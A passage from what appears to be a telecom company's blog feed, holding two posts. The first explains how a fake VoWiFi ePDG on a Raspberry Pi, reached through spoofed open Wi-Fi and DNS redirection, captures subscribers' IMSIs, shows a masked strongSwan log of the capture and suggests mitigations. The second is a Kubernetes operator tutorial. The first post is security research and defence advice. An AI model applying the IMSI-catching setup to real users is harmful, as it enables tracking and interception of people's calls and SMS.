ways once known. It is bound to the sim, so changing UE will not help.</p><p>Examples:</p><ul><li>Locating user (UE)</li><li>Intercepting calls</li><li>Intercepting SMS (stealing two factor pin eg.)</li><li>..and more</li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="how-vowifi-works">How VoWifi works<a class="hash-link" href="#how-vowifi-works" title="Direct link to heading">​</a></h2><p>When your phone is connected to datanetwork and with volte and vowifi enabled
the device (UE) establish sip session directly to packetgateway via 4g, and via
public internet to epdg (evolved packet data gateway) which is in essence a
ipsec (ikev2) termination using SIM-AKA to authenticate UE. The ipsec comes into
play since epdg is exposed publicly.</p><p>We won't go further in depth for volte and vowifi since there are already
excellent articles about the matter:</p><ul><li><a href="https://en.wikipedia.org/wiki/Voice_over_WLAN" target="_blank" rel="noopener noreferrer">Voice over WLAN</a></li><li><a href="https://en.wikipedia.org/wiki/Voice_over_LTE" target="_blank" rel="noopener noreferrer">Voice over LTE</a></li></ul><p><img alt="VoWifi topology" src="/assets/images/vowifi-ed900be33ec8a7b58034fb2e5a8a8dca.jpg" width="672" height="280"></p><p>To enable VoWifi on your device, please refer to your device manufacturer website:</p><ul><li><a href="https://support.google.com/phoneapp/answer/2811843?hl=en" target="_blank" rel="noopener noreferrer">Android</a></li><li><a href="https://support.apple.com/en-in/HT203032" target="_blank" rel="noopener noreferrer">Apple</a></li></ul><p>Also check on your operator website if VoWifi is supported in your region. Please note that VoWifi is usually blocked when roaming.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="epdg-exposed-on-the-public-internet">EPDG exposed on the public internet<a class="hash-link" href="#epdg-exposed-on-the-public-internet" title="Direct link to heading">​</a></h2><p>The Evolved Packet Data Gateway needs to be publicly available on the internet
since UE needs to access it from an arbitrary no-trusted connection. The ipsec
will secure and encrypt both the data and maintain the integrity of the
connection throughout the session.</p><p>The UE finds the epdg termination point by looking dns records partly following
a convention decided by 3gpp and typically looks like this in DNS:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">epdg.epc.mnc999.mcc999.pub.3gppnetwork.org. 3488 IN A 1.2.3.4</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">epdg.epc.mnc999.mcc999.pub.3gppnetwork.org. 3488 IN A 5.6.7.8</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>From the DNS records we recognize the network operator (MNC) and the
country code (MCC).</p><p>The DNS records are registered under a delegated domain owned by GSMA and
usually are redelegated to operator under their own umbrella, like the example
mnc999.mcc999.pub.3gppnetwork.org.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-problem">The problem<a class="hash-link" href="#the-problem" title="Direct link to heading">​</a></h2><p>When UE establish session to epdg it uses a vpn, a ipsec relationship using
IKEv2 for authentication, encryption and integrity.</p><p>So far the implementation works as intended and provides good security through
encryption and security.</p><p>The problem is not the VoWifi per see, by rather how ipsec establish the
session. When UE connects to the epdg, it acts as a initiator and the epdg is
inherently passive since it cannot know where from (ip) the UE will come from.</p><p><img alt="sim-aka flow" src="/assets/images/sim-aka-a216f5fd634021b704462a689f2df6ae.png" width="464" height="450"></p><h3 class="anchor anchorWithStickyNavbar_mojV" id="eap-aka-exposes-identity">EAP-AKA exposes identity<a class="hash-link" href="#eap-aka-exposes-identity" title="Direct link to heading">​</a></h3><p>Vowifi as mentioned earlier utilises an encryption protocol based on the widely
adopted Extensible Authentication Protocol. EAP itself is just a protocol and
does not define the contents of the data or how exact the data exchanges look
like. EAP-AKA unfortunately exposes the unencrypted user identity during
the authentication session and in this case the user identity is equal to the
imsi.</p><h4 class="anchor anchorWithStickyNavbar_mojV" id="solution">Solution<a class="hash-link" href="#solution" title="Direct link to heading">​</a></h4><p>This is the hardest problem to solve since it needs a security layer or settings
that comes before ipsec starts to connect.</p><p>The proposed solutions</p><ul><li>Force the use of conservative peer for eap-aka/sim
and use pseudonym identity (tmsi) to avoid exposing imsi.</li><li>Enable EAP-TTLS in addition to EAP-AKA/SIM</li><li>Only connect trusted/encrypted AP's</li></ul><h3 class="anchor anchorWithStickyNavbar_mojV" id="fake-ipsec-termination-exposes-identity">Fake Ipsec termination exposes identity<a class="hash-link" href="#fake-ipsec-termination-exposes-identity" title="Direct link to heading">​</a></h3><p>By impersonating a epdg by redirecting all dns requests for any
<code>pub.3gppnetwork.org.</code> to our own fake ipsec termination providing just enough
to catch the imsi.</p><p>A raspberry pie can easily be setup to constantly scan for open wifi networks,
then impersonating the ssid in hope of lure ue's to connect. Any UE set to use
VoWiFi connecting to the fake access point will give away their imsi.</p><p>A wifi ssid scan example of what we can automate. In this case the Isfjell-Guest
would have been picked to catch imsi since its open and unencrypted:</p><p><img alt="wifi-ssid" src="/assets/images/wlan-ssid-8239810014d356e06b17543cf45951d2.png" width="474" height="109"></p><p>Snippet from the ipsec termination, UE (iPhone 8) exposes imsi several times:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[ENC] parsed IKE_AUTH request 2 [ EAP/RES/AKA ]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[IKE] '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org' is not a reauth identity</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[IKE] '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org' is not a pseudonym</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[IKE] received identity '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[IKE] no EAP key found for 09999994511******@wlan.mnc999.mcc999.3gppnetwork.org to authenticate with AKA</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[LIB] tried 0 SIM providers, but none had a quintuplet for '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[IKE] failed to map pseudonym/reauth identity '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org', fallback to permanent identity request</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[ENC] generating IKE_AUTH response 2 [ EAP/REQ/AKA ]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[NET] sending packet: from 192.168.17.1[500] to 192.168.17.24[500] (92 bytes)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[NET] received packet: from 192.168.17.24[500] to 192.168.17.1[500] (140 bytes)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[ENC] parsed IKE_AUTH request 3 [ EAP/RES/AKA ]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[IKE] received identity '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[IKE] no EAP key found for 09999994511******@wlan.mnc999.mcc999.3gppnetwork.org to authenticate with AKA</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[LIB] tried 0 SIM providers, but none had a quintuplet for '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[IKE] EAP method EAP_AKA failed for peer 09999994511******@nai.epc.mnc999.mcc999.3gppnetwork.org</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[ENC] generating IKE_AUTH response 3 [ EAP/FAIL ]</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h4 class="anchor anchorWithStickyNavbar_mojV" id="solution-1">Solution<a class="hash-link" href="#solution-1" title="Direct link to heading">​</a></h4><p>Ipsec clients (UE) are able to verify the identity of the epdg by requesting
and validating a machine certificate proving it is the actual service belonging
to the requested dns address. This means when the client connects, the server
has to provide a valid certificate containing the dns names and signed by a
trusted CA.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="raspberry-pi-4">Raspberry PI 4<a class="hash-link" href="#raspberry-pi-4" title="Direct link to heading">​</a></h2><p>The specific physical setup used for testing. Older PI's should work just fine and also
other platforms that can run dnsmasq, tshark and strongswan for ipsec with
support for eap-aka/sim.</p><p><img alt="rpi4 and battery" src="/assets/images/rpi4-batt-331b622857ead4ba1f8081397efe866f.jpg" width="640" height="480"></p><p><em>white box is the rpi4 in a original casing and gray box is a battery bank</em></p>]]></content>
        <author>
            <name/>
            <uri>https://www.linkedin.com/in/rskjetlein/</uri>
        </author>
        <category label="telco" term="telco"/>
        <category label="4G" term="4G"/>
        <category label="ePDG" term="ePDG"/>
        <category label="VoWifi" term="VoWifi"/>
        <category label="networking" term="networking"/>
        <category label="security" term="security"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Extending Kubernetes for our needs]]></title>
        <id>extending-k8s/</id>
        <link href="https://www.wgtwo.com/blog/extending-k8s/"/>
        <updated>2020-02-21T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[We are using Kubernetes as our cluster scheduler and this serves us well. However we have a]]></summary>
        <content type="html"><![CDATA[<p>We are using Kubernetes as our cluster scheduler and this serves us well. However we have a
few cases where we need to do some additional work.</p><p>One case for example is that we have to use static IPs for some of our services to connect to
Telecom companies as they expect a single IP address to bind to. This address needs to be fixed and
DNS records are not accepted either. We are running in AWS as well, so the reader might ask why are we not
using Elastic IPs and adding them to the services? Good idea, but Telecom operators will not whitelist
an Elastic IP for you as there are no guarantees that it will belong to your company infrastructure forever. There
are also additional challenges when it comes to using Elastic IP in private subnet over VPN or direct connect.</p><p>We are a member of RIPE and do have a small subnet block for our own use, so we thought we could make use of
that. As we own the block and AWS supports BYOIP (Bring your own IP-range), we created a special subnet with
some Kubernetes nodes in it. This was not enough to make this work since we depended on a service always having
the same IP attached to it, as well as the node running a pod having some very specific Routes set.</p><p>With this scenario in mind we set out to find solutions and all solutions we could think of required haggling
with Kubernetes.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="extending-kubernetes">Extending Kubernetes<a class="hash-link" href="#extending-kubernetes" title="Direct link to heading">​</a></h2><p>There are several ways to extend Kubernetes. All functionality in Kubernetes is build upon very nice and clean
public APIs, or to say it with other words: There is no private API magic hidden somewhere. So lets look at
two ways on how to extend Kubernetes.</p><p>Possible ways to go forward:</p><ul><li>Adding a scheduler extender</li><li>Creating an operator/controller</li></ul><p>There are more ways to extend Kubernetes, but these two ways will be the one we shall look at. Just for completeness
you can as well also add another scheduler or change Kubernetes itself. However these possibilities have some serious
downsides.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="adding-a-scheduler-extender">Adding a scheduler extender<a class="hash-link" href="#adding-a-scheduler-extender" title="Direct link to heading">​</a></h3><p>The Kubernetes scheduler checks for certain requirements before it schedules a pod onto a node. Some of these requirements
are hard requirements, like cpu, memory and number of pods. Other requirements are more soft, like if the pods are allowed to
be packed together or in which AZ they are going to run. All of those requirements are collected and points given to each
node on how well they meet the requirements. The node that fits best, gets chosen.</p><p>All of these are things the scheduler will do for you automatically, however it is also possible to give the cluster a
<code>KubeSchedulerConfiguration</code> object that will tell the scheduler to also reach out to a service for additional point scoring.
The SchedulerConfiguration is a JSON file and for further explanations, please have a look at this
excellent <a href="https://developer.ibm.com/articles/creating-a-custom-kube-scheduler/" target="_blank" rel="noopener noreferrer">blog post</a>.</p><p>In our case, we could have written a service that checks which IP Addresses are assigned to the Nodes and moved the Pods
onto those nodes. This would have required us to make sure that those nodes had all needed IP-Addresses all the time.
That sounded not very enticing when doing cluster upgrades as it would have needed to be at least a semi-manual process.
So we decided against this approach.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="creating-an-operator">Creating an operator<a class="hash-link" href="#creating-an-operator" title="Direct link to heading">​</a></h3><p>An Operator/Controller on the other hand is a component observing resources and then try to create the declared resources.
The difference between a controller and an operator is basically that an operator is handling the lifecycle of an
application, whereas a controller may control specific resources that are not associated with a specific application.
They both use the controller pattern though and both can be implemented with the same toolset, so for simplicity sake in the
context of this article, we will consider them to be equal.</p><p>Operators usually consists at least out of a <strong><a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/" target="_blank" rel="noopener noreferrer">CRD(CustomResourceDefinition)</a></strong>, an <strong>event listener</strong> and a <strong>reconciliation loop</strong>.
The <em>CRD</em> basically creates a new type of resource and effectively implements a domain specific language for the operator. The whole description on what this deployment
needs to look like and all its abilities need to be defined in the <em>CRD</em>. The operator will create an <em>event listener</em> for that
<em>CRD</em> as the primary resource and additional <em>event listeners</em> for the secondary resource (most likely pods in this example).
The <em>event listener</em> will let the <em>reconciliation loop</em> know once a <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete" target="_blank" rel="noopener noreferrer">CRUD</a> operation has been requested on either the primary or
secondary resource. The <em>loop</em> will then try to bring the <em>CRD</em> into the desired state, depending on what operation has been
requested. So in the Redis example it will either create the pods, update the pods, in the case of an upgrade it might blue/green
deploy the pods or delete the pods. Basically things a human operator would do in this case, just in programmatic form, taking it
from a declarative form into existing resources.</p><p>As our initial problem was making services available on static IP addresses, we chose to explore this approach further,
basically attaching additional IP addresses to the nodes running specific pods.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="building-an-operatorcontroller">Building an Operator/Controller<a class="hash-link" href="#building-an-operatorcontroller" title="Direct link to heading">​</a></h2><p>For building an operator, there are several frameworks out there, but we will only look at the <a href="https://github.com/operator-framework/operator-sdk" target="_blank" rel="noopener noreferrer">operator-framework</a> in
this article.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="operator-sdk">Operator-SDK<a class="hash-link" href="#operator-sdk" title="Direct link to heading">​</a></h3><p>The Operator framework is a project that is designed to help you get started on creating an operator. To achieve that,
it will generate quite a bit of boilerplate.</p><p>The Operator-SDK supports three different models of creating an operator:</p><ul><li>Helm</li><li>Ansible</li><li>Golang</li></ul><p>Depending on your choice of tool, you will be able to integrate deeper into Kubernetes or not.</p><p><img alt="operator-sdk-capabilites" src="/assets/images/operator-capability-level-f511b5d60b3e9160a4582577204888cd.png" title="Operator sdk capabilities (Taken from the operator-sdk repo)" width="2440" height="1200">
<em><a href="https://github.com/operator-framework/operator-sdk/blob/master/README.md" target="_blank" rel="noopener noreferrer">Operator sdk capabilities</a></em></p><p>As we didn't want to be limited by our choice later on and wanted to expose metrics from our operator, we chose to
implement our operator in golang. We will be using the operator-sdk version 0.12 for this.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="what-we-want-to-do">What we want to do<a class="hash-link" href="#what-we-want-to-do" title="Direct link to heading">​</a></h3><p>Looking at the problem again, we need some way to make sure that a node that runs a specific pod, needs to
have an IP address attached to it. This IP address will be given to connecting parties as a entry point to our
system and thus cannot change.</p><p>Features it needs to support</p><ul><li>Reserve IP address from range</li><li>Attach IP address to node running pod</li><li>Detach IP address from node that is not running pod</li><li>Move IP addresses around in case of node failure</li></ul><p>This feature list already shows some things we will not and most likely cannot support. For example autoscaling of
replica sets will not work as an IP address is bound to a node with an assigned pod. There is
a 1-1 association here. However it is still possible to use the self-healing properties of Deployments
in this case.</p><p>When thinking about modelling this behaviour, we basically decided on the following approach:</p><ul><li>Create a IP kind (for reserving the IP Address in the Range)</li><li>Use annotations to attach the IP Address to a pod</li></ul><p>We also thought about creating a StaticIPDeployment kind, but at the end decided against it, as
we feared that the lifecycle management would be way more complicated if we needed to manage a deployment
instead of just controlling the assignment of an IP Address.</p><p>After all this is the first Operator we are going to write and didn't want to drown in complexity from day one.
We would rather iterate and scrap everything after we tried it, then going too complex from the start.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="implementation">Implementation<a class="hash-link" href="#implementation" title="Direct link to heading">​</a></h3><p>The first thing you do when starting off a new operator, is that you initialize the directory of your
operator with the following command:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">operator-sdk new app-operator --repo &lt;YOURREPO&gt;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>This will create some boilerplate folders and files for you and will look roughly like this:</p><p><img alt="operator-fs-structure" src="/assets/images/operator-structure-1a847ce462732788fdab91235ce1a528.png" title="Operator Folder Structure" width="351" height="169"></p><p>The next thing you might want to do is then add the boilerplate for a CRD and a Controller:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">operator-sdk add api --api-version=ip.wgtwo.com/v1alpha1 --kind=IP</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">operator-sdk add controller --api-version=ip.wgtwo.com/v1alpha1 --kind=IP</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>After creating the boilerplate, your folder structure will look a lot like this:</p><p><img alt="operator-fs-structure-expanded" src="/assets/images/operator-structure-expanded-5901aa50d6e40055e6140151f960b40f.png" title="Operator Folder Structure Expanded" width="335" height="536"></p><p>The most important files right now are in:</p><ul><li>cmd/manager/main.go (the main program that will run in the cluster)</li><li>pkg/apis/ip/v1alpha1/ip_types.go (definition of the CRD)</li><li>pkg/controller/ip_controller.go (event listener and reconciliation loop)</li></ul><h4 class="anchor anchorWithStickyNavbar_mojV" id="creating-the-crd">Creating the CRD<a class="hash-link" href="#creating-the-crd" title="Direct link to heading">​</a></h4><p>To start off, we define how our CRD should look like to be able to manage our IP Address. We do this,
by creating structs in go that have all the fields our CRD shall have. This includes metadata, "spec" and
"status" fields.</p><p>There is also a bit of operator-sdk specific code we need to add. This is so that the sdk can generate the
openapi spec and other auto-generated code.</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">// +k8s:openapi-gen=true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">// +kubebuilder:subresource:status</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">// +kubebuilder:resource:path=ips,scope=Cluster</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">type IP struct {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    metav1.TypeMeta   `json:",inline"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    metav1.ObjectMeta `json:"metadata,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Spec   IPSpec   `json:"spec,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Status IPStatus `json:"status,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>The "spec" needs to contain all information the controller needs to create the resource.
The "status" part needs to contain all the bookkeeping information the controller needs to work. In a way the
"status" fields are used as a database for operating Kubernetes (yes, this is oversimplified).</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">// +k8s:openapi-gen=true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">type IPSpec struct {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Address string `json:"address"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Reassign bool `json:"reassign,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">// IPStatus defines the observed state of IP</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">// +k8s:openapi-gen=true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">type IPStatus struct {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Assigned bool   `json:"assigned"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Claimed  bool   `json:"claimed"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Node     string `json:"node,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Pod      string `json:"pod,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Original IPSpec `json:"original,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>As you can see our new IP Resource type, as defined by the CRD that we are gonna create from these structs, is
going to have two fields: "Address" and "Reassign".
The corresponding "status" part of the resource, has a lot more fields, which we are using for bookkeeping.</p><p>After we have created those structs and know how the CRD needs to look like, we actually auto-generate the CRD yaml:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">operator-sdk generate k8s</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">operator-sdk generate openapi</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>NB: This changed since operator-sdk 0.15</p><h4 class="anchor anchorWithStickyNavbar_mojV" id="creating-the-controller">Creating the controller<a class="hash-link" href="#creating-the-controller" title="Direct link to heading">​</a></h4><p>There are two main parts to the controller. One part that creates a watcher on resources and one part
that reconciles your resource (in our case the IP and Pods).</p><h5 class="anchor anchorWithStickyNavbar_mojV" id="watching-for-resource-changes">Watching for resource changes<a class="hash-link" href="#watching-for-resource-changes" title="Direct link to heading">​</a></h5><p>The watch code is in our case in the <code>add</code> function of ip_controller.go:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">    // Watch for changes to primary resource IP, as this always requires an action</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    err = c.Watch(&amp;source.Kind{Type: &amp;ipv1alpha1.IP{}}, &amp;handler.EnqueueRequestForObject{})</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    if err != nil {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        return err</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    // Create Filter list triggering on ip.wgtwo.com/ip as annotation</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    pred := predicate.Funcs{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        // Ignore the pod if it does not contain annotation ip.wgtwo.com/ip</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        CreateFunc: func(e event.CreateEvent) bool {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            return hasAnnotation(e.Meta)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        UpdateFunc: func(e event.UpdateEvent) bool {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            if hasAnnotation(e.MetaOld) || hasAnnotation(e.MetaNew){</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                return true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            } else {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                return false</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        DeleteFunc: func(e event.DeleteEvent) bool {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            // Evaluates to false if the object has been confirmed deleted.</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            return !e.DeleteStateUnknown</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    // Watch for all pods having the right annotation</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    err = c.Watch(&amp;source.Kind{Type: &amp;corev1.Pod{}}, &amp;handler.EnqueueRequestForObject{}, pred)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Here we are creating watchers for all changes to the <code>IP</code> resource and watchers for all create/update/delete operations on
pods, if they have a specific annotation set.</p><p>If any of these conditions are met, the reconciliation loop will be triggered.</p><h5 class="anchor anchorWithStickyNavbar_mojV" id="reconciliation">Reconciliation<a class="hash-link" href="#reconciliation" title="Direct link to heading">​</a></h5><p>This is where the business logic of your operator/controller is sitting. The <code>Reconcile</code> function in <code>ip_controller.go</code> will
be triggered whenever one of the watch conditions fits.
We do not know which type of resource triggered the loop, so that is the first thing we need to figure out:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">oip := &amp;ipv1alpha1.IP{}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">err := r.client.Get(context.TODO(), request.NamespacedName, oip)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">if err == nil {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ... yes it is a resource of kind IP ... go and do business</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">...</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">op := &amp;corev1.Pod{}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">err = r.client.Get(context.TODO(), request.NamespacedName, op)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">if err == nil {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ... yes it is a resource of kind Pod ... go and do business</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">...</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>In these two code blocks, we are handling all the interactions for the primary resource of kind IP and the secondary
resource of type pod. Depending on what has happened last we have different scenarios.</p><p>Cases for the IP resource to consider:</p><ul><li>IP is new</li><li>IP has been modified</li><li>IP has been deleted</li></ul><p>Cases for the Pod resource to consider:</p><ul><li>Annotation sticking the IP to the pod has been deleted</li><li>IP needs to be assigned to a pod</li><li>Pod has moved to another node</li><li>Pod has been deleted</li></ul><p>We will not go any further into the detail on what these parts are actually doing, as this is enough
to actually give you an idea on how this can be accomplished.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="summary">Summary<a class="hash-link" href="#summary" title="Direct link to heading">​</a></h2><p>We have been looking at how to expand Kubernetes to suit our needs better. Creating the Operator/Controller
has taught us quite a bit about how Kubernetes works and has already saved us work in the past
few months, especially on node failures.</p><p>The operator-sdk has been a great tool for us to solve this problem and we see that there is a lot of work
going into it, making it simpler to create operators. It might look intimidating at first, but is worth the effort and
we think in the future Kubernetes operators will be the way how stateful components will be managed.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="resources--further-reading">Resources / Further Reading<a class="hash-link" href="#resources--further-reading" title="Direct link to heading">​</a></h2><ul><li>Programming Kubernetes by Stefan Schimanski and Michael Hausenblas</li><li><a href="https://developer.ibm.com/articles/creating-a-custom-kube-scheduler/" target="_blank" rel="noopener noreferrer">Creating a custom kube-scheduler</a></li><li><a href="https://github.com/operator-framework/operator-sdk" target="_blank" rel="noopener noreferrer">Operator SDK</a></li></ul>]]></content>
        <author>
            <name>Holger Ihrig</name>
            <uri>https://www.linkedin.com/in/hihrig/</uri>
        </author>
        <category label="infrastructure" term="infrastructure"/>
        <category label="kubernetes" term="kubernetes"/>
        <category label="networking" term="networking"/>
        <category label="AWS" term="AWS"/>
    </entry>
    <entry>
